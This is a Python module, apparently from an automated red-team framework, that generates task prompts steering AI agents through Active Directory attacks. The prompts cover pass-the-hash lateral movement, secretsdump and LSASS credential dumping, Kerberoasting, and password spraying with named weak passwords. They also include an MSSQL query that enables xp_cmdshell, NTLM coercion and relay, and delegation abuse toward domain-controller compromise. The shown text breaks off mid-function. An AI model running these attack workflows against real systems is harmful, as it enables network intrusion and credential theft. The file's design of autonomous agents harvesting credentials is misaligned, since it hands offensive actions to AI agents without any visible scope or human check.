"""Prompt generation for worker tasks.

This module provides utilities for generating prompts from task payloads
and formatting shared state context for task execution.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, Any

from ares.core.messages import MessageType
from ares.core.worker.dc_resolution import resolve_dc_ip_for_domain

if TYPE_CHECKING:
    from ares.core.models import SharedRedTeamState
    from ares.core.task_queue import TaskMessage


def _is_pass_the_hash_compatible(hash_value: str | None) -> bool:
    """Check if a hash value is compatible with pass-the-hash attacks (NTLM format)."""
    if not hash_value:
        return False
    normalized = hash_value.strip()
    if "$" in normalized:
        return False
    if ":" in normalized:
        parts = normalized.split(":")
        if len(parts) != 2:
            return False
        lm_part, ntlm_part = parts
        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
            return False
        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", normalized))


def format_state_context(  # noqa: PLR0912
    state: SharedRedTeamState | None,
    task_type: str,
    current_target: str | None = None,
) -> str:
    """
    Format shared state as context for task prompts.

    This provides workers with visibility into all discovered credentials,
    hosts, hashes, and opportunities so they can make strategic decisions.

    Args:
        state: The shared red team state
        task_type: Type of task (lateral, credential_access, exploit, coercion)
        current_target: The primary target of this task (for prioritization)

    Returns:
        Formatted state context string to append to task prompts
    """
    if not state:
        return ""

    lines = ["\n\n## STATE"]

    # Domains - compact
    if state.all_domains:
        lines.append(f"\nDomains: {', '.join(state.all_domains[:5])}")

    # Credentials - compact, only show count + first few
    if state.all_credentials:
        lines.append(f"\n### Credentials ({len(state.all_credentials)})")
        for cred in state.all_credentials[:8]:
            admin_marker = " [ADMIN]" if cred.is_admin else ""
            lines.append(f"  {cred.domain}\\{cred.username}:{cred.password}{admin_marker}")

    # Hashes - only cracked ones are useful for context
    if state.all_hashes:
        cracked = [h for h in state.all_hashes if h.cracked_password]
        if cracked:
            lines.append(f"\n### Cracked ({len(cracked)})")
            for h in cracked[:5]:
                lines.append(f"  {h.domain}\\{h.username}:{h.cracked_password}")

    # Hosts - compact, prioritized
    if state.all_hosts:
        dcs = [h for h in state.all_hosts if h.is_dc]
        if dcs:
            lines.append(f"\n### DCs ({len(dcs)})")
            for h in dcs[:3]:
                lines.append(f"  {h.ip} ({h.hostname or '?'})")

        # Only show other hosts if few
        others = [h for h in state.all_hosts if not h.is_dc]
        if others and len(others) <= 5:
            lines.append(f"\n### Other hosts ({len(others)})")
            for h in others:
                lines.append(f"  {h.ip} ({h.hostname or '?'})")

    # Pending vulns - compact
    if hasattr(state, "discovered_vulnerabilities") and state.discovered_vulnerabilities:
        unexploited = [
            v
            for v in state.discovered_vulnerabilities.values()
            if v.vuln_id not in state.exploited_vulnerabilities
        ]
        if unexploited:
            lines.append(f"\n### Pending vulns ({len(unexploited)})")
            for vuln in unexploited[:3]:
                lines.append(f"  {vuln.vuln_type} on {vuln.target}")

    return "\n".join(lines)


# Mapping of message types to task prompt generators (for dispatcher-based messaging)
TASK_PROMPTS: dict[MessageType, Any] = {
    MessageType.CRACK_REQUEST: lambda msg: (
        f"Crack this hash for user {msg.username}@{msg.domain}:\n"
        f"Hash: {msg.hash_value}\n"
        f"Type: {msg.hash_type}\n"
        f"Wordlist: {msg.wordlist}\n"
        f"Task ID: {msg.task_id}\n\n"
        "Use hashcat or john to crack this hash. Report the result using task_complete."
    ),
    MessageType.LATERAL_REQUEST: lambda msg: (
        f"Perform lateral movement to {msg.target_host}:\n"
        f"Username: {msg.domain}\\{msg.username}\n"
        f"Credential ({'password' if msg.password else 'hash'}): "
        f"{msg.password or msg.hash_value or 'N/A'}\n"
        f"Method: {msg.method or 'auto-select'}\n"
        f"Task ID: {msg.task_id}\n\n"
        "Use the exact credential value above; do not substitute placeholders. "
        "Try to establish access using psexec, evil-winrm, or wmi. "
        "If successful, run secretsdump to harvest credentials. "
        "Report the result using task_complete."
    ),
    MessageType.ACL_ANALYSIS_REQUEST: lambda msg: (
        f"Analyze ACLs and find attack paths:\n"
        f"Target User: {msg.target_user}\n"
        f"Domain: {msg.domain}\n"
        f"Find Path To: {msg.find_path_to}\n"
        f"Task ID: {msg.task_id}\n\n"
        "Use provided ACL/BloodHound context if available. "
        "If pathing data is missing, request BloodHound analysis from recon/orchestrator. "
        "Execute any viable ACL abuse attacks. Report the result using task_complete."
    ),
    MessageType.CREDENTIAL_ACCESS_REQUEST: lambda msg: (
        "Perform credential access against the target environment:\n"
        f"Domain: {msg.domain}\n"
        f"Targets: {', '.join(msg.target_ips) if msg.target_ips else 'N/A'}\n"
        f"Username: {msg.username or 'N/A'}\n"
        f"Credential ({'password' if msg.password else 'hash' if msg.hash_value else 'none'}): "
        f"{msg.password or msg.hash_value or 'N/A'}\n"
        f"Techniques: {', '.join(msg.techniques) if msg.techniques else 'auto-select'}\n"
        f"Task ID: {msg.task_id}\n\n"
        "Use the exact credential value above; do not substitute placeholders. "
        "Prioritize GetNPUsers/AS-REP roast, Kerberoast, secretsdump, and LSASS "
        "if credentials allow. Report any hashes or credentials using task_complete."
    ),
    MessageType.EXPLOIT_REQUEST: lambda msg: (
        f"Exploit vulnerability:\n"
        f"Type: {msg.vuln_type}\n"
        f"Target: {msg.target}\n"
        f"Vuln ID: {msg.vuln_id}\n"
        f"Params: {msg.params}\n"
        f"Task ID: {msg.task_id}\n\n"
        "Execute the appropriate exploitation technique. "
        "Report any credentials or access obtained using task_complete.\n"
        "If you obtain credentials or hashes, include a JSON block:\n"
        "```json\n"
        '{"credential": {"username": "", "password": "", "domain": "", "is_admin": false}}\n'
        "```\n"
        "or\n"
        "```json\n"
        '{"hash": {"username": "", "hash_value": "", "hash_type": "NTLM", "domain": ""}}\n'
        "```"
    ),
    MessageType.COERCION_REQUEST: lambda msg: (
        f"Start network coercion:\n"
        f"Interface: {msg.interface}\n"
        f"Techniques: {', '.join(msg.techniques)}\n"
        f"Duration: {msg.duration}s\n"
        f"Task ID: {msg.task_id}\n\n"
        "Start responder/mitm6 and capture any hashes. "
        "Report captured credentials using task_complete."
    ),
}


def generate_prompt_from_task(
    task: TaskMessage,
    state: SharedRedTeamState | None = None,
) -> str | None:
    """
    Generate agent prompt from Redis TaskMessage.

    This is used when polling tasks from Redis queue instead of dispatcher.

    Args:
        task: TaskMessage from Redis queue
        state: Optional shared state to include context about all discovered
               credentials, hosts, hashes, and vulnerabilities

    Returns:
        Prompt string for the agent
    """
    payload = task.payload

    if task.task_type == "crack":
        # Crack tasks don't need state context - they're deterministic
        return (
            f"Crack this hash for user {payload.get('username', 'unknown')}"
            f"@{payload.get('domain', '')}:\n"
            f"Hash: {payload['hash_value']}\n"
            f"Type: {payload['hash_type']}\n"
            f"Wordlist: {payload.get('wordlist', 'rockyou.txt')}\n"
            f"Task ID: {task.task_id}\n\n"
            "Use hashcat or john to crack. "
            "When cracked, call report_cracked_credential(task_id, username, password, hash, domain). "
            "If cracking fails, call report_crack_failed(task_id, hash, reason)."
        )

    if task.task_type == "lateral":
        action = payload.get("action", "")

        # Special handling for proactive MSSQL enumeration
        if action == "mssql_enum_impersonation":
            target = payload.get("target", "")
            username = payload.get("username", "")
            password = payload.get("password", "")
            domain = payload.get("domain", "")
            base_prompt = (
                f"**MSSQL IMPERSONATION ENUMERATION**\n\n"
                f"Target: {target}\n"
                f"Username: {domain}\\{username}\n"
                f"Password: {password}\n"
                f"Task ID: {task.task_id}\n\n"
                "**OBJECTIVE:** Discover if sa/sysadmin impersonation is possible.\n\n"
                "**STEP 1: Run impersonation enumeration**\n"
                "```\n"
                f"mssql_enum_impersonation(\n"
                f"    target='{target}',\n"
                f"    username='{username}',\n"
                f"    password='{password}',\n"
                f"    domain='{domain}',\n"
                "    windows_auth=True\n"
                ")\n"
                "```\n\n"
                "**STEP 2: If sa/sysadmin found, IMMEDIATELY exploit:**\n"
                "```\n"
                f"mssql_impersonate(\n"
                f"    target='{target}',\n"
                f"    username='{username}',\n"
                f"    password='{password}',\n"
                "    impersonate_user='sa',\n"
                "    query='SELECT SYSTEM_USER; EXEC sp_configure \"xp_cmdshell\", 1; RECONFIGURE;',\n"
                f"    domain='{domain}',\n"
                "    windows_auth=True\n"
                ")\n"
                "```\n\n"
                "**STEP 3: With xp_cmdshell, run whoami then attempt secretsdump**\n\n"
                "Report any credentials or hashes discovered."
            )
            state_context = format_state_context(state, "lateral", current_target=target)
            return base_prompt + state_context

        # Standard lateral movement
        cred_type = "password" if payload.get("password") else "hash"
        cred_value = payload.get("password") or payload.get("hash_value") or "N/A"
        target_host = payload.get("target_host", "")
        base_prompt = (
            f"Perform lateral movement to {target_host}:\n"
            f"Username: {payload.get('domain', '')}\\{payload['username']}\n"
            f"Credential ({cred_type}): {cred_value}\n"
            f"Method: {payload.get('method') or 'auto-select'}\n"
            f"Task ID: {task.task_id}\n\n"
            "Use the exact credential value above; do not substitute placeholders. "
            "Try psexec, then wmiexec or evil-winrm if needed. "
            "If access succeeds, run secretsdump to harvest credentials. "
            "Call report_lateral_success(task_id, target, method, new_credentials, new_hashes) "
            "with any credentials/hashes found as JSON. "
            "If access fails, call report_lateral_failed(task_id, target, reason)."
        )
        state_context = format_state_context(state, "lateral", current_target=target_host)
        return base_prompt + state_context

    if task.task_type == "acl_analysis":
        base_prompt = (
            f"Analyze ACLs and find attack paths:\n"
            f"Target User: {payload['target_user']}\n"
            f"Domain: {payload['domain']}\n"
            f"Find Path To: {payload.get('find_path_to', 'Domain Admins')}\n"
            f"Task ID: {task.task_id}\n\n"
            "Use provided ACL/BloodHound context if available. "
            "If pathing data is missing, request BloodHound analysis from recon/orchestrator. "
            "Execute viable ACL abuse attacks (shadow credentials, targeted kerberoast, "
            "ForceChangePassword, WriteDACL, etc.)."
        )
        state_context = format_state_context(state, "acl_analysis")
        return base_prompt + state_context

    if task.task_type == "credential_access":
        return _generate_credential_access_prompt(task, payload, state)

    if task.task_type == "exploit":
        return _generate_exploit_prompt(task, payload, state)

    if task.task_type == "coercion":
        from ares.core.config import get_default_network_interface

        techniques = payload.get("techniques", ["LLMNR", "NBT-NS"])
        interface = payload.get("interface") or get_default_network_interface()
        attack_type = payload.get("attack_type", "passive")
        coerce_target = payload.get("coerce_target", "")
        coerce_hostname = payload.get("coerce_hostname", "")

        # Build attack-specific info
        target_info = ""
        if attack_type == "esc8":
            adcs_server = payload.get("adcs_server", "")
            target_info = f"**ESC8 RELAY** - ADCS: {adcs_server}, Coerce DC: {coerce_hostname or coerce_target}\n\n"
        elif attack_type == "ldaps_relay":
            target_info = f"**LDAPS RELAY** - Coerce DC: {coerce_hostname or coerce_target}\n\n"

        base_prompt = (
            f"Start network coercion:\n"
            f"**NETWORK INTERFACE: `{interface}`** (auto-detected for this environment)\n"
            f"Techniques: {', '.join(techniques)}\n"
            f"Duration: {payload.get('duration', 300)}s\n"
            f"Task ID: {task.task_id}\n\n"
            f"{target_info}"
            f'**CRITICAL: When calling start_responder or start_mitm6, pass `interface="{interface}"` exactly.**\n'
            "Do NOT guess interface names (e.g., eth0) - always use the auto-detected value above.\n\n"
            "**STEP BUDGET: ~30 steps max. Work efficiently!**\n\n"
            "**HARD LIMITS:**\n"
            "- Each coercion technique: max 2 attempts per target\n"
            "- 'connection refused'/'timed out'/'RPC unavailable' → SKIP target\n"
            "- Track attempts - never repeat same target+technique\n\n"
            "**CALL task_complete WHEN:**\n"
            "- All targets attempted | Relay succeeded | Duration exceeded\n\n"
        )
        state_context = format_state_context(state, "coercion")
        return base_prompt + state_context

    if task.task_type == "privesc_enumeration":
        return _generate_privesc_enumeration_prompt(task, payload, state)

    if task.task_type == "recon":
        return _generate_recon_prompt(task, payload, state)

    # "command" tasks are handled specially - executed directly, not via agent
    if task.task_type == "command":
        # Return None to signal direct execution
        return None

    # Generic fallback
    return f"Execute task: {task.task_type}\nPayload: {payload}\nTask ID: {task.task_id}"


def _generate_credential_access_prompt(  # noqa: PLR0912
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
) -> str:
    """Generate prompt for credential access tasks."""
    hash_value = payload.get("hash_value")
    hash_is_pth = _is_pass_the_hash_compatible(hash_value)
    techniques = payload.get("techniques", []) or []
    if hash_value and not hash_is_pth:
        techniques = [
            technique
            for technique in techniques
            if technique.lower() not in {"secretsdump", "lsassy"}
        ]
    cred_type = (
        "password" if payload.get("password") else "hash" if payload.get("hash_value") else "none"
    )
    targets = payload.get("target_ips") or []
    dc_ip = payload.get("dc_ip") or ""
    domain = payload.get("domain", "")

    # Handle Kerberos ticket-based auth (from S4U attack auto-chain)
    ticket_path = payload.get("ticket_path")
    no_pass = payload.get("no_pass", False)
    if ticket_path and no_pass and "secretsdump" in techniques:
        target = targets[0] if targets else ""
        username = payload.get("username", "Administrator")
        base_prompt = (
            "**KERBEROS TICKET-BASED SECRETSDUMP**\n\n"
            f"Target: {target}\n"
            f"Domain: {domain}\n"
            f"Username: {username}\n"
            f"Ticket Path: {ticket_path}\n"
            f"DC IP: {dc_ip or 'N/A'}\n"
            f"Task ID: {task.task_id}\n\n"
            "**CRITICAL: You have a Kerberos ticket from S4U attack!**\n"
            "This ticket allows you to impersonate Administrator to the target.\n\n"
            "**EXECUTE secretsdump with Kerberos ticket:**\n"
            f"secretsdump(\n"
            f"    target='{target}',\n"
            f"    username='{username}',\n"
            f"    no_pass=True,\n"
            f"    ticket_path='{ticket_path}'"
        )
        if dc_ip:
            base_prompt += f",\n    dc_ip='{dc_ip}'"
        base_prompt += (
            "\n)\n\n"
            "**IMPORTANT:**\n"
            "- The ticket_path sets KRB5CCNAME for Kerberos auth\n"
            "- no_pass=True tells secretsdump to use -k -no-pass\n"
            "- This will dump SAM, LSA secrets, and domain hashes if on a DC\n\n"
            "If secretsdump succeeds, look for:\n"
            "- krbtgt hash → GOLDEN TICKET capability\n"
            "- Administrator hash → DOMAIN ADMIN ACHIEVED\n\n"
            "Report any hashes found in JSON format:\n"
            "```json\n"
            '{"hash": {"username": "Administrator", "hash_value": "...", "hash_type": "NTLM", "domain": "..."}}\n'
            "```"
        )
        state_context = format_state_context(state, "credential_access", current_target=target)
        return base_prompt + state_context

    # Validate/re-resolve DC IP for Kerberos operations (critical for kerberoast, AS-REP, etc.)
    dc_warning = None
    kerberos_techniques = {"kerberoast", "as_rep_roast", "secretsdump", "lsassy", "laps_dump"}
    if any(t in kerberos_techniques for t in techniques) and domain:
        # Always try to resolve DC IP for Kerberos ops - even if empty or mismatched
        dc_ip, dc_warning = resolve_dc_ip_for_domain(state, domain, dc_ip or "")

    reason = payload.get("reason") or ""
    source = payload.get("credential_source") or ""
    hash_type = payload.get("hash_type") or ""
    reason_line = f"Reason: {reason}\n" if reason else ""
    source_line = f"Credential Source: {source}\n" if source else ""
    hash_type_line = f"Hash Type: {hash_type}\n" if hash_type else ""
    hash_note = ""
    if hash_value and not hash_is_pth:
        cred_type = "hash (non-NTLM)"
        hash_note = (
            "NOTE: Provided hash is not NTLM pass-the-hash compatible; "
            "do not attempt secretsdump/lsassy with it.\n"
        )
    # Check if this is a low_hanging_fruit task
    has_sysvol = any(t in techniques for t in ("sysvol_script_search", "gpp_password_finder"))
    has_spray = any(t in techniques for t in ("username_as_password", "password_spray"))
    has_low_hanging = "low_hanging_fruit" in reason.lower() or has_sysvol or has_spray

    if has_low_hanging and payload.get("password"):
        # Low hanging fruit with creds - prioritize SYSVOL/GPP
        base_prompt = (
            "Perform LOW HANGING FRUIT credential harvesting:\n"
            f"Domain: {payload.get('domain', '')}\n"
            f"DC IP: {dc_ip or 'N/A'}\n"
            f"Username: {payload.get('username') or 'N/A'}\n"
            f"Password: {payload.get('password')}\n"
            f"Task ID: {task.task_id}\n\n"
            "**EXECUTE IN THIS ORDER:**\n"
            "1. gpp_password_finder(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n"
            "2. sysvol_script_search(target=DC_IP, username=USER, password=PASS, domain=DOMAIN)\n"
            "3. ldap_search_descriptions(...) - check for passwords in LDAP descriptions\n"
            "4. username_as_password(...) - check for user=password accounts\n\n"
            "These are HIGH SUCCESS RATE techniques that find hardcoded credentials.\n"
            "Report any credentials found immediately."
        )
        state_context = format_state_context(state, "credential_access", current_target=dc_ip)
        return base_prompt + state_context

    # Specific username_as_password task (for new users without creds)
    is_username_spray = "username_as_password" in techniques and "new_users" in reason.lower()
    if is_username_spray:
        username = payload.get("username") or ""
        password = payload.get("password") or ""
        cred_line = ""
        if username and password:
            cred_line = (
                f"**Use these credentials for user enumeration:**\n"
                f"Username: {username}\n"
                f"Password: {password}\n\n"
            )
        base_prompt = (
            "Perform USERNAME_AS_PASSWORD spray to find weak credentials:\n"
            f"Domain: {payload.get('domain', '')}\n"
            f"DC IP: {dc_ip or 'N/A'}\n"
            f"Task ID: {task.task_id}\n\n"
            f"{cred_line}"
            "**EXECUTE username_as_password:**\n"
            f"1. First save users: save_users_to_file(target='{dc_ip}', username='{username}', password='{password}', domain='{payload.get('domain', '')}')\n"
            f"2. Then spray: username_as_password(target='{dc_ip}', domain='{payload.get('domain', '')}', users_file='/tmp/users.txt')\n\n"
            "This tests if users have username=password (e.g., testuser:testuser).\n"
            "Zero lockout risk, one attempt per user.\n"
            "Report any credentials found immediately."
        )
        state_context = format_state_context(state, "credential_access", current_target=dc_ip)
        return base_prompt + state_context

    # Share spider task - search SMB shares for credentials
    is_share_spider = "share_spider" in techniques
    if is_share_spider and payload.get("password"):
        username = payload.get("username") or ""
        password = payload.get("password") or ""
        domain = payload.get("domain") or ""
        target_ip = targets[0] if targets else ""
        # Extract share name from reason if present (auto_share_spider_SHARENAME)
        share_name = ""
        if "auto_share_spider_" in reason.lower():
            share_name = reason.lower().split("auto_share_spider_")[-1]

        base_prompt = (
            "**SHARE SPIDER TASK - Search SMB shares for credentials**\n\n"
            f"Target: {target_ip}\n"
            f"Domain: {domain}\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
            f"Share hint: {share_name or 'enumerate all readable shares'}\n"
            f"Task ID: {task.task_id}\n\n"
            "**INSTRUCTIONS:**\n"
            f"1. Use smbclient_spider(target='{target_ip}', share='{share_name or 'all'}', "
            f"username='{username}', password='{password}', domain='{domain}')\n"
            "2. Look for interesting files containing credentials:\n"
            "   - *.txt files (passwords, connection strings)\n"
            "   - *.xml, *.ini, *.config files (configuration with creds)\n"
            "   - *.ps1, *.bat, *.cmd files (scripts with hardcoded passwords)\n"
            "3. If files are found, use smb_download_file to retrieve them\n"
            "4. Parse downloaded files for credentials\n\n"
            "**COMMON FINDINGS:**\n"
            "- Service account passwords in config files\n"
            "- Database connection strings with credentials\n"
            "- Admin passwords in deployment scripts\n"
            "- User credentials in text files (e.g., secret.txt)\n\n"
            "Report any credentials found immediately!"
        )
        state_context = format_state_context(state, "credential_access", current_target=target_ip)
        return base_prompt + state_context

    # EXPLICIT TECHNIQUE ENFORCEMENT FOR NO-CRED TASKS
    # When techniques are specified without credentials, still enforce them
    no_cred_techniques = not payload.get("password") and not payload.get("hash_value")
    if techniques and no_cred_techniques:
        # Build technique-specific instructions for no-cred scenarios
        technique_instructions = []
        no_cred_technique_map = {
            "asrep_roast": (
                f"asrep_roast(target='{dc_ip}', domain='{payload.get('domain', '')}') "
                "- find users without Kerberos pre-auth"
            ),
            "username_as_password": (
                f"username_as_password(target='{dc_ip}', domain='{payload.get('domain', '')}') "
                "- test if users have username=password (e.g., testuser:testuser)"
            ),
            "password_spray": (
                f"password_spray(target='{dc_ip}', domain='{payload.get('domain', '')}', "
                "password='Password1') - try common passwords"  # pragma: allowlist secret
            ),
            "kerberos_user_enum_noauth": (
                f"kerberos_user_enum_noauth(target='{dc_ip}', domain='{payload.get('domain', '')}') "
                "- enumerate valid usernames via Kerberos"
            ),
        }

        for i, technique in enumerate(techniques, 1):
            if technique in no_cred_technique_map:
                technique_instructions.append(f"{i}. {no_cred_technique_map[technique]}")
            else:
                technique_instructions.append(f"{i}. {technique}(...)")

        if technique_instructions:
            base_prompt = (
                "**MANDATORY TECHNIQUE EXECUTION (NO CREDENTIALS)**\n\n"
                f"Domain: {payload.get('domain', '')}\n"
                f"DC IP: {dc_ip or 'N/A'}\n"
                f"Targets: {', '.join(targets) if targets else 'N/A'}\n"
                f"Task ID: {task.task_id}\n\n"
                "⚠️ **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n"
                "⚠️ **DO NOT run smb_sweep or other slow recon first!**\n"
                "⚠️ **Complete assigned techniques BEFORE doing anything else.**\n\n"
                + "\n".join(technique_instructions)
                + "\n\n"
                "**WORKFLOW:**\n"
                "1. Execute EACH technique above in order\n"
                "2. Report ANY credentials/hashes found immediately\n"
                "3. Only after completing ALL assigned techniques, mark task complete\n\n"
                "**DO NOT:**\n"
                "- Run smb_sweep (wastes 5+ minutes, not your job)\n"
                "- Do additional enumeration before completing assigned techniques\n"
            )
            state_context = format_state_context(state, "credential_access", current_target=dc_ip)
            return base_prompt + state_context

    # Fallback: Low hanging fruit WITHOUT credentials - use anonymous/null session techniques
    if has_low_hanging and not payload.get("password") and not payload.get("hash_value"):
        base_prompt = (
            "Perform LOW HANGING FRUIT credential discovery (NO CREDENTIALS):\n"
            f"Domain: {payload.get('domain', '')}\n"
            f"DC IP: {dc_ip or 'N/A'}\n"
            f"Task ID: {task.task_id}\n\n"
            "**CRITICAL: These techniques work WITHOUT credentials to discover passwords:**\n"
            "1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE\n"
            "   Tests if users have username=password (e.g., testuser:testuser)\n"
            "   Zero lockout risk, one attempt per user\n\n"
            "2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:\n"
            "   password_spray(target=DC_IP, domain=DOMAIN, password='Password1')  # pragma: allowlist secret\n"
            "   password_spray(target=DC_IP, domain=DOMAIN, password='Welcome1')  # pragma: allowlist secret\n"
            "   password_spray(target=DC_IP, domain=DOMAIN, password='Summer2024')  # pragma: allowlist secret\n"
            "   password_spray(target=DC_IP, domain=DOMAIN, password='Company123')  # pragma: allowlist secret\n"
            "   password_spray(target=DC_IP, domain=DOMAIN, password='Passw0rd!')  # pragma: allowlist secret\n"
            "   **Call spray for EACH password above - common weak passwords**\n\n"
            "3. password_policy(target=DC_IP, domain=DOMAIN) - Check lockout before spraying\n\n"
            "These are the FIRST techniques to run when you have no credentials.\n"
            "Report any credentials found immediately."
        )
        state_context = format_state_context(state, "credential_access", current_target=dc_ip)
        return base_prompt + state_context

    # EXPLICIT TECHNIQUE ENFORCEMENT: When techniques are specified, run ONLY those first
    # This prevents the agent from getting distracted by recon (smb_sweep, etc.)
    has_creds = payload.get("password") or (hash_is_pth and hash_value)
    if techniques and has_creds:
        # Build technique-specific instructions
        technique_instructions = []
        # Determine credential parameter (password or hash)
        cred_param = (
            f"password='{payload.get('password')}'"
            if payload.get("password")
            else f"hashes='{hash_value}'"
        )
        cred_display = payload.get("password") or f"[HASH] {hash_value}"

        technique_map = {
            "sysvol_script_search": (
                f"sysvol_script_search(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- ~2 seconds, finds hardcoded passwords in login scripts"
            ),
            "gpp_password_finder": (
                f"gpp_password_finder(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- ~2 seconds, finds GPP/cpassword credentials"
            ),
            "ldap_search_descriptions": (
                f"ldap_search_descriptions(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- finds passwords in LDAP description fields"
            ),
            "kerberoast": (
                f"kerberoast(domain='{payload.get('domain', '')}', username='{payload.get('username')}', "
                f"{cred_param}, dc_ip='{dc_ip}') "
                "- service account hashes (uses correct DC for the domain)"
            ),
            "secretsdump": (
                f"secretsdump(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- dump hashes (requires admin)"
            ),
            "lsassy": (
                f"lsassy(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- LSASS memory dump"
            ),
            "laps_dump": (
                f"laps_dump(target='{dc_ip}', username='{payload.get('username')}', "
                f"{cred_param}, domain='{payload.get('domain', '')}') "
                "- LAPS local admin passwords"
            ),
        }

        for i, technique in enumerate(techniques, 1):
            if technique in technique_map:
                technique_instructions.append(f"{i}. {technique_map[technique]}")
            else:
                technique_instructions.append(f"{i}. {technique}(...)")

        if technique_instructions:
            # Include DC warning if DC IP was re-resolved
            dc_warning_line = f"\n{dc_warning}\n" if dc_warning else ""
            base_prompt = (
                "**MANDATORY TECHNIQUE EXECUTION**\n\n"
                f"Domain: {payload.get('domain', '')}\n"
                f"DC IP: {dc_ip or 'N/A'}\n"
                f"{dc_warning_line}"
                f"Targets: {', '.join(targets) if targets else 'N/A'}\n"
                f"Username: {payload.get('username') or 'N/A'}\n"
                f"Credential: {cred_display}\n"
                f"Task ID: {task.task_id}\n\n"
                "⚠️ **CRITICAL: YOU MUST EXECUTE THESE TECHNIQUES IN ORDER:**\n"
                "⚠️ **DO NOT run smb_sweep, kerberos_user_enum, or other recon first!**\n"
                "⚠️ **These techniques are FAST (~2-5 seconds each) and HIGH VALUE.**\n\n"
                + "\n".join(technique_instructions)
                + "\n\n"
                "**WORKFLOW:**\n"
                "1. Execute EACH technique above in order - they are FAST\n"
                "2. Report ANY credentials found immediately\n"
                "3. Only after completing ALL assigned techniques, mark task complete\n\n"
                "**DO NOT:**\n"
                "- Run smb_sweep (wastes 5+ minutes)\n"
                "- Run kerberos_user_enum_noauth (not your job)\n"
                "- Do additional recon before completing assigned techniques\n"
            )
            state_context = format_state_context(state, "credential_access", current_target=dc_ip)
            return base_prompt + state_context

    base_prompt = (
        "Perform credential access against the target environment:\n"
        f"Domain: {payload.get('domain', '')}\n"
        f"Targets: {', '.join(targets) if targets else 'N/A'}\n"
        f"DC IP: {dc_ip or 'N/A'}\n"
        f"Username: {payload.get('username') or 'N/A'}\n"
        f"Credential ({cred_type}): {payload.get('password') or payload.get('hash_value') or 'N/A'}\n"
        f"{hash_type_line}"
        f"{source_line}"
        f"{reason_line}"
        f"Techniques: {', '.join(techniques) or 'auto-select'}\n"
        f"Task ID: {task.task_id}\n\n"
        f"{hash_note}"
        "Use the exact credential value above; do not substitute placeholders. "
        "If DC IP is provided, pass -dc-ip to Kerberos/LDAP tools to avoid DNS issues. "
        "**PRIORITY ORDER when creds available:**\n"
        "1. gpp_password_finder + sysvol_script_search (LOW HANGING FRUIT - run first!)\n"
        "2. Kerberoast for service account hashes\n"
        "3. secretsdump if admin access exists\n"
        "4. LSASS dumping if viable\n"
        "Report any hashes or credentials found."
    )
    state_context = format_state_context(state, "credential_access", current_target=dc_ip)
    return base_prompt + state_context


def _generate_exploit_prompt(
    task: TaskMessage,
    payload: dict[str, Any],
    state: SharedRedTeamState | None,
) -> str:
    """Generate prompt for exploit tasks."""
    vuln_type = payload.get("vuln_type", "")
    target = payload.get("target", "")
    base_prompt = (
        f"Exploit vulnerability:\n"
        f"Type: {vuln_type}\n"
        f"Target: {target}\n"
        f"Vuln ID: {payload.get('vuln_id', 'unknown')}\n"
        f"Params: {payload}\n"
        f"Task ID: {task.task_id}\n\n"
    )

    # Special handling for ADCS enumeration
    if vuln_type == "adcs_enumerate":
        domain = payload.get("domain", "")
        dc_ip = payload.get("dc_ip", target)
        username = payload.get("username", "")
        password = payload.get("password", "")

        adcs_prompt = (
            f"**ADCS ENUMERATION TASK**\n\n"
            f"Target CA Server: {target}\n"
            f"Domain: {domain}\n"
            f"DC IP: {dc_ip}\n"
            f"Credentials: {domain}\\{username}\n"
            f"Task ID: {task.task_id}\n\n"
            "**STEP BUDGET: ~20 steps max. Work efficiently!**\n\n"
            "**HARD LIMITS:**\n"
            "- 'connection refused'/'timed out' → CA unreachable, STOP immediately\n"
            "- 'web enrollment' error → ESC8 not viable, skip it\n"
            "- Max 2 attempts at certipy_find, then report failure\n\n"
            "**INSTRUCTIONS:**\n"
            "1. Run certipy_find to enumerate ADCS vulnerabilities:\n"
            f"   certipy_find(domain='{domain}', username='{username}', "
            f"password='{password}', dc_ip='{dc_ip}')\n\n"
            "2. Look for ESC1-ESC15 vulnerabilities in the output\n"
            "3. Report any vulnerable templates found\n"
            "4. If ESC1/ESC4 found: can request cert with arbitrary UPN\n"
            "5. If ESC8 found: web enrollment relay attack possible\n\n"
            "**ON FAILURE**: Call task_complete immediately with failure reason.\n"
            "Do NOT keep retrying if CA/web enrollment is unreachable."
        )
        state_context = format_state_context(state, "exploit", current_target=target)
        return adcs_prompt + state_context

    # Special handling for MSSQL vulnerabilities
    if vuln_type.startswith("mssql_"):
        return _generate_mssql_exploit_prompt(task, payload, state, base_prompt, target)

    # Special handling for constrained delegation (S4U attack)
    if vuln_type == "constrained_delegation":
        return _generate_constrained_delegation_prompt(task, payload, state, target)

    # Special handling for unconstrained delegation
    if vuln_type == "unconstrained_delegation":
        account = payload.get("account", target)
        domain = payload.get("domain", "")

        unconstrained_prompt = (
            f"**UNCONSTRAINED DELEGATION EXPLOITATION**\n\n"
            f"Account with unconstrained delegation: {account}\n"
            f"Domain: {domain}\n"
            f"Task ID: {task.task_id}\n\n"
            "**EXPLOITATION WORKFLOW:**\n"
            "1. If you have access to the machine with unconstrained delegation:\n"
            "   - Dump TGTs from memory using mimikatz or Rubeus\n"
            "   - Look for high-value tickets (Domain Admins, DCs)\n\n"
            "2. If you need to coerce authentication:\n"
            "   - Request coercion (PetitPotam, PrinterBug) against a DC\n"
            "   - The DC's TGT will be cached on this machine\n"
            "   - Extract and use the TGT for DCSync\n\n"
            "**CRITICAL**: Unconstrained delegation = potential DC compromise!\n"
            "Report any credentials or hashes obtained."
